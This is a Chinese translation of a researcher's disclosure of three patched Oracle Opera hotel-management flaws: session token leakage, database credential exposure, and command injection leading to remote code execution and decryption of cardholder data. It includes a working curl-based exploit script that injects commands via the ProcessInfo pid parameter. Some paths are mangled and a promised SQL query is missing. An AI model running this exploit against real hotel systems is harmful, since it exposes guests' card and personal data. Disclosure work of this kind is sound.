# 漏洞分析：Oracle酒店管理平台的远程命令执行和持卡人数据解密漏洞

## 译文声明
本文为翻译文章，原文来源：jackson.thuraisamy.me
译文仅供参考，具体内容及含义以原文为准。

**翻译：** ResoLutiOn  
**预估稿费：** 200RMB（不服你也来投稿啊！）  
**投稿方式：** 发送邮件至 linwei#360.cn 或登录网页版在线投稿

## 前言
近期，我发现一些大型商务酒店使用的前台数据管理系统（Oracle Opera）中存在多个安全漏洞。攻击者可以利用这些漏洞进行提权操作，获取更高的用户权限，并进入酒店管理网络的后台数据库及操作系统，实施远程代码执行（RCE）攻击。攻击者可以在未经身份验证的情况下访问Oracle Opera数据库系统，窃取顾客的身份信息、电话号码等隐私数据。甲骨文公司已经收到相关报告并及时修复了这些漏洞，并发布了详细的漏洞报告。[[报告传送门]](http://www.oracle.com/technetwork/security-advisory/cpuoct2016verbose-2881725.html#HOSP)

## Oracle Opera系统简介
Oracle Opera（也称为Opera PMS，前身为Micros Opera）是由甲骨文子公司Micros开发的一款酒店前台操作系统，专为全球各大商务酒店设计。它提供了全面、系统的管理工具，帮助酒店管理层和员工高效处理客户资料、预订、入住退房、客房分配、设施管理和账单管理等工作。凯悦（Hyatt）、希尔顿（Hilton）等知名酒店均使用该系统。

在顾客支付过程中，应用程序会将银行卡相关信息（如PAN码、失效日期、持卡人姓名等）保存在后台数据库中。目前，已披露了三种进入后台数据库的攻击方法。一旦攻击者获得数据库登录权限，便能盗取并解密其中的隐私数据。

经过分析，我发现问题主要出在Opera PMS系统本身，而非用户操作。仅通过黑盒测试无法唯一确定漏洞性质。不同于以往的漏洞解决方案，由于供应商提供了详尽的解决方案，这给黑客攻击创造了更多机会。攻击者可以通过动态和静态分析找到进入数据库的最佳切入点。

## 漏洞详解

### CVE-2016-5665: 窃取系统日志文件，实施会话劫持
用户登录Oracle Opera系统后，可以选择一个系统接口进行交互会话。启动接口的请求中包含会话令牌和特定参数。问题在于，这些令牌和其他参数存储在一个目录文件中，攻击者无需身份验证即可通过Web服务器访问该文件。

攻击者只需等待具有管理员权限的用户登录，然后通过应用程序获取系统的所有操作权限。管理员权限允许对数据库中的数据进行查询、修改和删除等操作。然而，攻击者通常不会采用这种方法，因为它速度慢且容易被发现。直接与数据库服务器建立连接的方式更快更有效。

### CVE-2016-5664: 泄漏系统数据库凭证信息
如果攻击者与数据库服务器在同一网络中，可以通过构造数据库连接字符串来窃取凭证。在Oracle Opera系统中，数据库凭证和服务名是通过经过验证的HTML请求返回的，用于启用Oracle Forms软件。攻击者可以通过执行未经验证的Servlet程序获取数据库服务器主机名。

获取凭证后，攻击者可以使用Sql*plus工具建立与数据库的连接，并以管理员身份登录，实时监控数据库。

### CVE-2016-5663: 通过系统命令注入实施RCE攻击
在以下两种情况下，攻击者可以利用此RCE漏洞：
1. 攻击者只能获取到应用程序服务器的登录权限（例如Internet Exposure）。
2. 攻击者只能通过应用程序服务器连接到数据库。

在数据传输完成后，系统会返回确认信息（如PID）。在黑盒测试中，PID参数不易察觉。攻击者可以修改该参数执行其他命令，并将输出结果放入可读文件中。如果一切顺利，程序会输出whoami并将结果放在webtemp文件下。如果出错，系统会提示“找不到相应文件”的错误信息。

在编译代码中，pslist工具的路径被硬编码为D:microsoperaoperaiasdefault.env，但实际上该文件不存在。为了修复这一错误，需要：
1. 找到OPERA_HOME属性的值。
2. 将其保存到D:microsoperaoperaiasdefault.env路径下。

巧合的是，我在系统中发现了另一个诊断程序，可以查看OPERA_HOME属性信息。通过将Servlet程序作为RFI载体上传至目标路径，可以验证操作是否成功。

下面的脚本程序可用于验证操作：
```bash
#!/bin/bash
STDOUT="D:microsoperaoperaiaswebtemptemp.log"
if [ "$#" -ne 2 ]; then
    echo "Usage: $0  "
    echo "E.g. : $0 http://opera.example.biz whoami"
    exit 1
else
    host="$1"
    cmd="$2"
fi
# Activate exploit.
curl -s -XPOST --data-binary "OPERA_HOME=D:microsopera" "$host/Operajserv/webarchive/FileReceiver?filename=D:/micros/opera/operaias/default.env&crc=26&append=false" > /dev/null
# Inject command.
curl -s -G --data-urlencode "pid=1 & $cmd > "$STDOUT" 2" "$host/Operajserv/webarchive/ProcessInfo" > /dev/null
curl -# -G "$host/webtemp/temp.log"
# Deactivate exploit.
curl -s -G --data-urlencode "pid=1 & del "$STDOUT" 2" "$host/Operajserv/webarchive/ProcessInfo" > /dev/null
curl -s -G --data-urlencode 'pid=1 & del "D:microsoperaoperaiasdefault.env" 2' "$host/Operajserv/webarchive/ProcessInfo" > /dev/null
```

### 持卡人信息解密
利用上述漏洞，攻击者可以获得数据库登录权限，从未经授权的接口进入Oracle Opera系统数据库，窃取并解密银行卡持卡人的私密数据。在SQL中，查询数据包包体的命令语句如下所示：

由于包体信息易混淆，攻击者可以进一步检索包体信息或破解3DES算法的密钥。获取算法和密钥后，攻击者可以找到加密数据的存储位置，并通过脚本程序将加密信息解析为明文。

## 后记
我对甲骨文公司发布的漏洞报告感到满意，描述非常详尽。在我提交关于PGP公钥安全漏洞报告后的24小时内，他们给予了回应，并表示将在下次软件补丁更新中修复CVE-2016-5663、CVE-2016-5664和CVE-2016-5665这三个漏洞。